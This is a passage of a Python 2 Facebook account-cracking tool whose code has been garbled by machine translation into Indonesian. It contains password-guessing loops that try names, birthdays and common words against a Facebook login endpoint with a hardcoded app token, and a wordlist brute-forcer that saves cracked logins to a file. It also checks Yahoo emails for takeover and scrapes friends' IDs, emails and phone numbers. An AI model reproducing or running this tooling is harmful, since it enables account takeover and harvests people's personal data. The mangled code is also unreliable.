        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()

    os.system ('clear')
    cetak logo
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    cetak '║-> \ x1b [1; 37; 40m1. Retak dari Teman
    cetak '║-> \ x1b [1; 37; 40m2. Retak dari Grup '
    cetak '║-> \ x1b [1; 37; 40m3. Retak dari File '
    cetak '║-> \ x1b [1; 31; 40m0. Kembali '
    cetak '\ x1b [1; 37; 40m║'
    pilih_super ()


def pilih_super ():
    puncak = input_awal ('╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m')
    jika puncak == '':
        print '\ x1b [1; 91m [!] Tidak boleh kosong'
        pilih_super ()
    lain:
        jika puncak == '1':
            os.system ('clear')
            cetak logo
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            jalan ('\ x1b [1; 91m [+] \ x1b [1; 92mMengambil id Teman \ x1b [1; 97m ...')
            r = requests.get ('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads (r.text)
            untuk s di z ['data']:
                id.append (s ['id'])

        lain:
            jika puncak == '2':
                os.system ('clear')
                cetak logo
                cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
                idg = input_kasar ('\ x1b [1; 91m [+] \ x1b [1; 92mID Grup \ x1b [1; 91m: \ x1b [1; 97m')
                mencoba:
                    r = requests.get ('https://graph.facebook.com/group/?id=' + idg + '& access_token =' + toket)
                    asw = json.loads (r.text)
                    cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName grup \ x1b [1; 91m: \ x1b [1; 97m' + asw ['nama']
                kecuali KeyError:
                    cetak '\ x1b [1; 91m [!] Grup tidak ditemukan'
                    masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                    super()

                re = requests.get ('https://graph.facebook.com/' + idg + '/ members? fields = name, id & limit = 999999999 & access_token =' + toket)
                s = json.loads (re.text)
                untuk i di ['data']:
                    id.append (i ['id'])
                    
            lain:
                jika puncak == '3':
                    os.system ('clear')
                    cetak logo
                    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
                    mencoba:
                        idlist = input_dasar ('\ x1b [1; 91m [+] \ x1b [1; 92mFile ID \ x1b [1; 91m: \ x1b [1; 97m')
                        untuk baris terbuka (idlist, 'r'). readlines ():
                        	id.append (line.strip ())
                    kecuali IOError:
                        cetak '\ x1b [1; 91m [!] File tidak ditemukan'
                        masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                        super()

                lain:
                    jika puncak == '0':
                        menu_hack ()
                    lain:
                        cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] \ x1b [1; 97m' + puncak + '\ x1b [1; 91mTidak ada'
                        pilih_super ()
    cetak '\ x1b [1; 91m [+] \ x1b [1; 92mTotal ID \ x1b [1; 91m: \ x1b [1; 97m' + str (len (id))
    jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mMohon Tunggu \ x1b [1; 97m ...')
    titik = ['. ',' .. ',' ... ']
    untuk o di titik:
        cetak '\ r \ r \ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ xb8 \ x1b [1; 91m] \ x1b [1; 92mCrack \ x1b [1; 97m' + o,
        sys.stdout.flush ()
        waktu tidur (0,01)

    mencetak
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'

    def main (arg):
        pengguna = arg
        mencoba:
                a = requests.get ('https://graph.facebook.com/' + user + '/? access_token =' + toket)
                b = json.loads (a.text)
                pass1 = b ['first_name'] + '123'
                data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '& locion=2&email=' + user + '& locion=2&email=' + user + '& locion = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                q = json.load (data)
                jika 'access_token' di q:
                    cetak '\ x1b [1; 97m \ x1b [1; 92m [✓] \ x1b [1; 97m' + pengguna + '| '+ pass1 +' -> '+ b [' nama ']
                lain:
                    jika 'www.facebook.com' dalam q ['error_msg']:
                        cetak '\ x1b [1; 97m \ x1b [1; 93m [+] \ x1b [1; 97m' + pengguna + '| '+ pass1 +' -> '+ b [' nama ']
                    lain:
                            pass2 = b ['firs_name'] + '12345'
                            data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '& locion=2&email=' + user + '& locion=2&email=' + user + '& locion = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                            q = json.load (data)
                            jika 'access_token' di q:
                                cetak '\ x1b [1; 97m \ x1b [1; 92m [✓] \ x1b [1; 97m' + pengguna + '| '+ pass2 +' -> '+ b [' nama ']
                            lain:
                                jika 'www.facebook.com' dalam q ['error_msg']:
                                    cetak '\ x1b [1; 97m \ x1b [1; 93m [+] \ x1b [1; 97m' + pengguna + '| '+ pass2 +' -> '+ [' nama ']
                                lain:
                                        pass3 = b ['last_name'] + '123'
                                        data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '& locion=2&email=' + user + '& locion=2&email=' + user + '& locion = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                                        q = json.load (data)
                                        jika 'access_token' di q:
                                            cetak '\ x1b [1; 97m \ x1b [1; 92m [✓] \ x1b [1; 97m' + pengguna + '| '+ pass3 +' -> '+ b [' nama ']
                                        lain:
                                            jika 'www.facebook.com' dalam q ['error_msg']:
                                                cetak '\ x1b [1; 97m \ x1b [1; 93m [+] \ x1b [1; 97m' + pengguna + '| '+ pass3 +' -> '+ b [' nama ']
                                            lain:
						    pass4 = b ['last_name'] + '12345'
                                                    data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '& locion=2&email=' + user + '& locion=2&email=' + user + '& locion = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                                                    q = json.load (data)
                                                    jika 'access_token' di q:
                                                        cetak '\ x1b [1; 97m \ x1b [1; 92m [✓] \ x1b [1; 97m' + pengguna + '| '+ pass4 +' -> '+ b [' nama ']
                				    lain:
                                                        jika 'www.facebook.com' dalam q ['error_msg']:
                                                            cetak '\ x1b [1; 97m \ x1b [1; 93m [+] \ x1b [1; 97m' + pengguna + '| '+ pass4 +' -> '+ b [' nama ']
                    					lain:
                                                                ulang tahun = b ['ulang tahun']
                                                                pass5 = birthday.replace ('/', '')
                                                                data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '& locion=2&email=' + user + '& locion=2&email=' + user + '& locion = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                                                                q = json.load (data)
                                                                jika 'access_token' di q:
                                                                    cetak '\ x1b [1; 97m \ x1b [1; 92m [✓] \ x1b [1; 97m' + pengguna + '| '+ pass5 +' -> '+ b [' nama ']
                                                                lain:
                                                                    jika 'www.facebook.com' dalam q ['error_msg']:
                                                                        cetak '\ x1b [1; 97m [\ x1b [1; 93m [+] \ x1b [1; 97m' + pengguna + '| '+ pass5 +' -> '+ b [' nama ']
                                                                    lain:
                                                                            pass6 = ('sayang')
                                                                            data = urllib.urlopen ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '& locion +' & sdkUS6 = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                                                                            q = json.load (data)
                                                                            jika 'access_token' di q:
                                                                                cetak '\ x1b [1; 97m \ x1b [1; 92m [✓] \ x1b [1; 97m' + pengguna + '| '+ pass6 +' -> '+ b [' nama ']
                                                                            lain:
                                                                                jika 'www.facebook.com' dalam q ['error_msg']:
                                                                                    cetak '\ x1b [1; 97m \ x1b [1; 93m [+] \ x1b [1; 97m' + pengguna + '| '+ pass6 +' -> '+ b [' nama ']

        kecuali:
            lulus

    p = ThreadPool (30)
    p.map (utama, id)
    cetak '\ n \ x1b [1; 91m [+] \ x1b [1; 97mSelesai'
    masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mKembali \ x1b [1; 91m]')
    super()


def brute ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (0,5)
        Gabung()
    lain:
        os.system ('clear')
        cetak logo
        cetak '╔' + 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
        mencoba:
            email = input_makan ('\ x1b [1; 91m [+] \ x1b [1; 92mID \ x1b [1; 97m / \ x1b [1; 92mEmail \ x1b [1; 97m / \ x1b [1; 92mHp \ x1b [1] ; 97mTarget \ x1b [1; 91m: \ x1b [1; 97m ')
            passw = raw_input ('\ x1b [1; 91m [+] \ x1b [1; 92mWordlist \ x1b [1; 97mext (list.txt) \ x1b [1; 91m: \ x1b [1; 97m' ')
            total = terbuka (passw, 'r')
            total = total.readlines ()
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mTarget \ x1b [1; 91m: \ x1b [1; 97m' + email
            cetak '\ x1b [1; 91m [+] \ x1b [1; 92mTotal \ x1b [1; 96m' + str (len (total)) + '\ x1b [1; 92mPassword'
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mHarap tunggu \ x1b [1; 97m ...')
            sandi = open (passw, 'r')
            untuk pw di sandi:
                mencoba:
                    pw = pw.replace ('\ n', '')
                    sys.stdout.write ('\ r \ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ xb8 \ x1b [1; 91m] \ x1b [1; 92mCoba \ x1b [1; 97m' + pw " )
                    sys.stdout.flush ()
                    data = requests.get ('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '& locale =' = ios & generate_session_cookies = 1 & sig = 3f555f99fb61fcd7aa0c44f58f522ef6 ')
                    mpsh = json.loads (data.text)
                    jika 'access_token' di mpsh:
                        Dapat = buka ('Brute.txt', 'w')
                        Dapat.write (email + '|' + pw + '\ n')
                        dapat.close ()
                        cetak '\ n \ x1b [1; 91m [+] \ x1b [1; 92mFounded.'
                        cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
                        cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mNama Pengguna \ x1b [1; 91m: \ x1b [1; 97m' + email
                        cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 91m: \ x1b [1; 97m' + pw
                        keluar ()
                    lain:
                        jika 'www.facebook.com' di mpsh ['error_msg']:
                            ceks = open ('Brutecekpoint.txt', 'w')
                            ceks.write (email + '|' + pw + '\ n')
                            ceks.close ()
                            cetak '\ n \ x1b [1; 91m [+] \ x1b [1; 92mFounded.'
                            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
                            print '\ x1b [1; 91m [!] \ x1b [1; 93mAccount Mungkin Checkpoint'
                            cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mNama Pengguna \ x1b [1; 91m: \ x1b [1; 97m' + email
                            cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mPassword \ x1b [1; 91m: \ x1b [1; 97m' + pw ''
                            keluar ()
                kecuali requests.exceptions.ConnectionError:
                    cetak '\ x1b [1; 91m [!] Kesalahan Koneksi'
                    waktu tidur (1)

        kecuali IOError:
            cetak '\ x1b [1; 91m [!] File tidak ditemukan ...'
            cetak '\ n \ x1b [1; 91m [!] \ x1b [1; 92mSepertinya kamu tidak memiliki daftar kata'
            tanyaw ()


def tanyaw ():
    why = raw_input ('\ x1b [1; 91m [?] \ x1b [1; 92mKamu ingin membuat wordlist? \ x1b [1; 92m [y / t] \ x1b [1; 91m: \ x1b [1; 97m' ')
    jika mengapa == '':
        print '\ x1b [1; 91m [!] Mohon Pilih \ x1b [1; 97m (y / t)'
        tanyaw ()
    lain:
        jika mengapa == 'y':
            Daftar kata()
        lain:
            jika mengapa == 'Y':
                Daftar kata()
            lain:
                jika mengapa == 't':
                    menu_hack ()
                lain:
                    jika mengapa == 'T':
                        menu_hack ()
                    lain:
                        print '\ x1b [1; 91m [!] Mohon Pilih \ x1b [1; 97m (y / t)'
                        tanyaw ()


def menu_yahoo ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()

    os.system ('clear')
    cetak logo
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    cetak '║-> \ x1b [1; 37; 40m1. Dari teman'
    cetak '║-> \ x1b [1; 37; 40m2. Dari File '
    cetak '║-> \ x1b [1; 31; 40m0. Kembali'
    cetak '\ x1b [1; 37; 40m║'
    yahoo_pilih ()


def yahoo_pilih ():
    go = input_kasar ('╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m')
    jika pergi == '':
        print '\ x1b [1; 91m [!] Tidak boleh kosong'
        yahoo_pilih ()
    lain:
        jika pergi == '1':
            yahoofriends ()
        lain:
            jika pergi == '2':
                yahoolist ()
            lain:
                jika pergi == '0':
                    menu_hack ()
                lain:
                    cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] \ x1b [1; 97m' + go + '\ x1b [1; 91mTidak ditemukan'
                    yahoo_pilih ()


def yahoofriends ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token Tidak Ada'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()

    os.system ('clear')
    cetak logo
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    mpsh = []
    jml = 0
    jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mMohon Tunggu \ x1b [1; 97m ...')
    friends = requests.get ('https://graph.facebook.com/me/friends?access_token=' + toket)
    kimak = json.loads (friends.text)
    simpan = buka ('MailVuln.txt', 'w')
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    untuk w di kimak ['data']:
        jml + = 1
        mpsh.append (jml)
        id = w ['id']
        nama = w ['nama']
        links = requests.get ('https://graph.facebook.com/' + id + '? access_token =' + toket)
        z = json.loads (links.text)
        mencoba:
            mail = z ['email']
            yahoo = kompilasi ulang ('@. *')
            otw = yahoo.search (mail) .group ()
            jika 'yahoo.com' di otw:
                br.open ('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = Benar
                br.select_form (nr = 0)
                br ['username'] = email
                klik = br.submit (). read ()
                jok = kompilasi ulang ('"messages.ERROR_INVALID_USERNAME">. *')
                mencoba:
                    pek = jok.search (klik) .group ()
                kecuali:
                    cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] \ x1b [1; 92mEmail \ x1b [1; 91m: \ x1b [1; 91m' + mail + '\ x1b [1; 97m [\ x1b [ 1; 92m '+ vulnot +' \ x1b [1; 97m] '
                    terus

                if '"messages.ERROR_INVALID_USERNAME">' di pek:
                    simpan.write (email + '\ n')
                    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
                    cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m' + nama "
                    cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mID \ x1b [1; 91m: \ x1b [1; 97m' + id
                    cetak '\ x1b [1; 91m [\ xe2 \ x9e \ xb9] \ x1b [1; 92mEmail \ x1b [1; 91m: \ x1b [1; 97m' + mail + '[\ x1b [1; 92m' + vuln + '\ x1b [1; 97m]'
                    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
                lain:
                    cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] \ x1b [1; 92mEmail \ x1b [1; 91m: \ x1b [1; 91m' + mail + '\ x1b [1; 97m [\ x1b [ 1; 92m '+ vulnot +' \ x1b [1; 97m] '
        kecuali KeyError:
            lulus

    cetak '\ n \ x1b [1; 91m [+] \ x1b [1; 97mSelesai'
    cetak '\ x1b [1; 91m [+] \ x1b [1; 97mSimpan \ x1b [1; 91m: \ x1b [1; 97m MailVuln.txt' '
    save.close ()
    masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mKembali \ x1b [1; 91m]')
    menu_yahoo ()


def yahoolist ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()
    lain:
        os.system ('clear')
        cetak logo
        cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
        file = input_makan ('\ x1b [1; 91m [+] \ x1b [1; 92mFile \ x1b [1; 91m: \ x1b [1; 97m')
        mencoba:
            total = terbuka (file, 'r')
            mail = total.readlines ()
        kecuali IOError:
            cetak '\ x1b [1; 91m [!] File tidak ditemukan'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            menu_yahoo ()

    mpsh = []
    jml = 0
    jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mHarap tunggu \ x1b [1; 97m ...')
    simpan = buka ('MailVuln.txt', 'w')
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    cetak '\ x1b [1; 91m [?] \ x1b [1; 97mStatus \ x1b [1; 91m: \ x1b [1; 97mRed [\ x1b [1; 92m' + vulnot + '\ x1b [1; 97m] Hijau] [\ x1b [1; 92m '+ vuln +' \ x1b [1; 97m] '
    mencetak
    mail = open (files, 'r'). readlines ()
    untuk pw di email:
        mail = pw.replace ('\ n', '')
        jml + = 1
        mpsh.append (jml)
        yahoo = kompilasi ulang ('@. *')
        otw = yahoo.search (mail) .group ()
        jika 'yahoo.com' di otw:
            br.open ('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = Benar
            br.select_form (nr = 0)
            br ['username'] = email
            klik = br.submit (). read ()
            jok = kompilasi ulang ('"messages.ERROR_INVALID_USERNAME">. *')
            mencoba:
                pek = jok.search (klik) .group ()
            kecuali:
                cetak '\ x1b [1; 91m' + mail
                terus

            if '"messages.ERROR_INVALID_USERNAME">' di pek:
                simpan.write (email + '\ n')
                cetak '\ x1b [1; 92m' + mail
            lain:
                cetak '\ x1b [1; 91m' + mail

    cetak '\ n \ x1b [1; 91m [+] \ x1b [1; 97mFinish'
    cetak '\ x1b [1; 91m [+] \ x1b [1; 97mSimpan \ x1b [1; 91m: \ x1b [1; 97m MailVuln.txt' '
    save.close ()
    masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
    menu_yahoo ()


def ambil ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()

    os.system ('clear')
    cetak logo
    cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
    cetak '║-> \ x1b [1; 37; 40m1. Dapatkan ID Dari Teman
    cetak '║-> \ x1b [1; 37; 40m2. Dapatkan ID Teman Dari Teman
    cetak '║-> \ x1b [1; 37; 40m3. Dapatkan ID Dari GRUP '
    cetak '║-> \ x1b [1; 37; 40m4. Dapatkan Email Teman '
    cetak '║-> \ x1b [1; 37; 40m5. Dapatkan Email Teman Dari Teman '
    cetak '║-> \ x1b [1; 37; 40m6. Dapatkan Telepon Dari Teman
    cetak '║-> \ x1b [1; 37; 40m7. Dapatkan Ponsel Teman Dari Teman
    cetak '║-> \ x1b [1; 31; 40m0. Kembali'
    cetak '\ x1b [1; 37; 40m║'
    grab_pilih ()


def grab_pilih ():
    cuih = input_awal ('╚═ \ x1b [1; 91m ▶ \ x1b [1; 97m')
    jika cuih == '':
        print '\ x1b [1; 91m [!] Tidak boleh kosong'
        grab_pilih ()
    lain:
        jika cuih == '1':
            id_friends ()
        lain:
            jika cuih == '2':
                idfrom_friends ()
            lain:
                jika cuih == '3':
                    id_member_grup ()
                lain:
                    jika cuih == '4':
                        surel()
                    lain:
                        jika cuih == '5':
                            emailfrom_friends ()
                        lain:
                            jika cuih == '6':
                                nomor_hp ()
                            lain:
                                jika cuih == '7':
                                    hpfrom_friends ()
                                lain:
                                    jika cuih == '0':
                                        menu_hack ()
                                    lain:
                                        cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] \ x1b [1; 97m' + cuih + '\ x1b [1; 91mtidak ditemukan'
                                        grab_pilih ()


def id_friends ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')

        waktu tidur (1)
        Gabung()
    lain:
        mencoba:
            os.system ('clear')
            cetak logo
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            r = requests.get ('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads (r.text)
            save_id = raw_input ('\ x1b [1; 91m [+] \ x1b [1; 92mSimpan File \ x1b [1; 97mext (file.txt) \ x1b [1; 91m: \ x1b [1; 97m') ')
            bz = buka (save_id, 'w')
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mHarap tunggu \ x1b [1; 97m ...')
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            untuk ah in z ['data']:
                idfriends.append (ah ['id'])
                bz.write (ah ['id'] + '\ n')
                cetak '\ r \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m' + ah ['name']
                cetak '\ x1b [1; 92mID \ x1b [1; 91m: \ x1b [1; 97m' + ah ['id']
                cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'

            cetak '\ n \ r \ x1b [1; 91m [+] \ x1b [1; 97mTotal ID \ x1b [1; 96m% s'% len (idfriends)
            cetak '\ x1b [1; 91m [+] \ x1b [1; 97mFile] \ x1b [1; 91m: \ x1b [1; 97m' + save_id
            bz.close ()
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mKembali \ x1b [1; 91m]')
            mengambil()
        kecuali IOError:
            print '\ x1b [1; 91m [!] Error saat membuat file'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mKembali \ x1b [1; 91m]')
            mengambil()
        kecuali (KeyboardInterrupt, EOFError):
            cetak '\ x1b [1; 91m [!] Berhenti'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mKembali \ x1b [1; 91m]')
            mengambil()
        kecuali KeyError:
            os.remove (save_id)
            print '\ x1b [1; 91m [!] Terjadi kesalahan'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mKembali \ x1b [1; 91m]')
            mengambil()
        kecuali requests.exceptions.ConnectionError:
            cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] Tidak ada koneksi'
            keluar ()


def idfrom_friends ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()
    lain:
        mencoba:
            os.system ('clear')
            cetak logo
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            idt = input_dasar ('\ x1b [1; 91m [+] \ x1b [1; 92mMasukkan ID Teman \ x1b [1; 91m: \ x1b [1; 97m')
            mencoba:
                jok = requests.get ('https://graph.facebook.com/' + idt + '? access_token =' + toket)
                op = json.loads (jok.text)
                cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mFrom \ x1b [1; 91m: \ x1b [1; 97m' + op ['nama']
            kecuali KeyError:
                cetak '\ x1b [1; 91m [!] Bukan teman'
                masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                mengambil()

            r = requests.get ('https://graph.facebook.com/' + idt + '? fields = friends.limit (5000) & access_token =' + toket)
            z = json.loads (r.text)
            save_idt = raw_input ('\ x1b [1; 91m [+] \ x1b [1; 92mSimpan File \ x1b [1; 97mext (file.txt) \ x1b [1; 91m: \ x1b [1; 97m' ')
            bz = buka (save_idt, 'w')
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mMohon Tunggu \ x1b [1; 97m ...')
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            untuk ah in z ['friends'] ['data']:
                idfromfriends.append (ah ['id'])
                bz.write (ah ['id'] + '\ n')
                cetak '\ r \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m' + ah ['name']
                cetak '\ x1b [1; 92mID \ x1b [1; 91m: \ x1b [1; 97m' + ah ['id']
                cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'

            cetak '\ n \ r \ x1b [1; 91m [+] \ x1b [1; 97mTotal ID \ x1b [1; 96m% s'% len (idfromfriends)
            cetak '\ x1b [1; 91m [+] \ x1b [1; 97mFile' \ x1b [1; 91m: \ x1b [1; 97m '+ save_idt
            bz.close ()
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mKembali \ x1b [1; 91m]')
            mengambil()
        kecuali IOError:
            print '\ x1b [1; 91m [!] Error saat membuat file'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mKembali \ x1b [1; 91m]')
            mengambil()
        kecuali (KeyboardInterrupt, EOFError):
            cetak '\ x1b [1; 91m [!] Berhenti'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mKembali \ x1b [1; 91m]')
            mengambil()
        kecuali requests.exceptions.ConnectionError:
            cetak '\ x1b [1; 91m [\ xe2 \ x9c \ x96] Tidak ada koneksi'
            keluar ()


def id_member_grup ():
    os.system ('clear')
    mencoba:
        toket = buka ('login.txt', 'r'). read ()
    kecuali IOError:
        print '\ x1b [1; 91m [!] Token tidak ditemukan'
        os.system ('rm -rf login.txt')
        waktu tidur (1)
        Gabung()
    lain:
        mencoba:
            os.system ('clear')
            cetak logo
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            id = input_dasar ('\ x1b [1; 91m [+] \ x1b [1; 92mID grup \ x1b [1; 91m: \ x1b [1; 97m' ')
            mencoba:
                r = requests.get ('https://graph.facebook.com/group/?id=' + id + '& access_token =' + toket)
                asw = json.loads (r.text)
                cetak '\ x1b [1; 91m [\ x1b [1; 96m \ xe2 \ x9c \ x93 \ x1b [1; 91m] \ x1b [1; 92mName group \ x1b [1; 91m: \ x1b [1; 97m' + asw ['nama']
            kecuali KeyError:
                cetak '\ x1b [1; 91m [!] Grup tidak ditemukan'
                masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
                mengambil()

            simg = input_kawal ('\ x1b [1; 91m [+] \ x1b [1; 97mSimpan File \ x1b [1; 97mext (file.txt) \ x1b [1; 91m: \ x1b [1; 97m')
            b = terbuka (simg, 'w')
            jalan ('\ x1b [1; 91m [\ xe2 \ x9c \ xba] \ x1b [1; 92mMohon Tunggu \ x1b [1; 97m ...')
            cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'
            re = requests.get ('https://graph.facebook.com/' + id + '/ members? fields = name, id & access_token =' + toket)
            s = json.loads (re.text)
            untuk i di ['data']:
                idmem.append (i ['id'])
                b. tulis (i ['id'] + '\ n')
                cetak '\ r \ x1b [1; 92mName \ x1b [1; 91m: \ x1b [1; 97m' + i ['name']
                cetak '\ x1b [1; 92mID \ x1b [1; 91m: \ x1b [1; 97m' + i ['id']
                cetak 52 * '\ x1b [1; 97m \ xe2 \ x95 \ x90'

            cetak '\ n \ r \ x1b [1; 91m [+] \ x1b [1; 97mTotal ID \ x1b [1; 96m% s'% len (idmem)
            cetak '\ x1b [1; 91m [+] \ x1b [1; 97mFile disimpan \ x1b [1; 91m: \ x1b [1; 97m' + simg '
            b. dekat ()
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            mengambil()
        kecuali IOError:
            print '\ x1b [1; 91m [!] Error saat membuat file'
            masukan_awal ('\ n \ x1b [1; 91m [\ x1b [1; 97mBack \ x1b [1; 91m]')
            mengambil()
        kecuali (KeyboardInterrupt, EOFError):
